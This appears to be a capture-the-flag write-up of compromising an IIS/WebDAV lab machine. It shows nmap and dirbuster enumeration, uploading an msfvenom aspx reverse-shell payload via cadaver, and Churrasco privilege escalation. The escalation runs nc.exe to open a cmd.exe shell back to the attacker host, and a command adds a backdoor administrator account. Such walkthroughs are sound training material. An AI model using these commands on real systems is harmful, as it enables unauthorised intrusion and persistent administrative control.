# Enumeration
- We use nmap for enumeration `sudo nmap -p- -A -T4 -O 10.10.10.15` which gives ![](attachment/678e9d802489391b23ea087823544165.png)
- We find that a website is hosted:![](attachment/4de56f784020bd493cdc884ed934eda8.png)
- We used dirbuster and found some hidden directories but they are empty![](attachment/2894ac828545017c7554ac988fab6b5f.png)
# Exploitation
## Non-metasploit
- WE find that certain risky requests are permitted using davtest![](attachment/c61997cae39eede6e853037e2b083b49.png)
- Only text and html files are executable so we generate our payload to .aspx format and rename it to .txt using `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.25 LPORT=1234 -f aspx >reverse.aspx` and `mv reverse.aspx reverse.txt`![](attachment/f37bba16e9e34c034804553b7d56d2ca.png)
- Then we use cadaver to start a dav session using `cadaver 10.10.10.15` and use a put request to upload our reverse.txt file then rename it to reverse.aspx using move![](attachment/668b8e6a614bb6d2809e59f1e5f9e719.png)
- we visit html://10.10.10.15/reverse.aspx with netcat listening where we get a shell![](attachment/28ca2624a2179607caf213cc9aadd3e9.png)
- We used the churrasco exploit from https://github.com/Re4son/Churrasco and nc.exe file by uploading in the same manner and executing  `churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe 10.10.14.25 4444 -e cmd.exe"` and listening on netcat using `nc -nlvp 4444` ![](attachment/22bc0f914d1eb59b601fa31228af87f9.png)
- can also run `churrasco.exe -d "net user hacker hacker /add && net localgroup Administrators hacker /add"`
- We get a root shell: ![](attachment/12bad755152eb233a29ccd78fd2e99db.png)
## Metasploit
- start metasploit and search for IIS exploits, find one and execute to get a meterpreter shell:![](attachment/bc9f10516acc3ce75146b70c48877944.png)
- using ps to list processes:![](attachment/c6deac7ba1aa16e85895e2058e1eeaca.png)
- We migrate to process 1964 for accessing the user
- We use exploit_suggester and exploit and get a shell. As all this is pretty self explanatory we wont go into detail.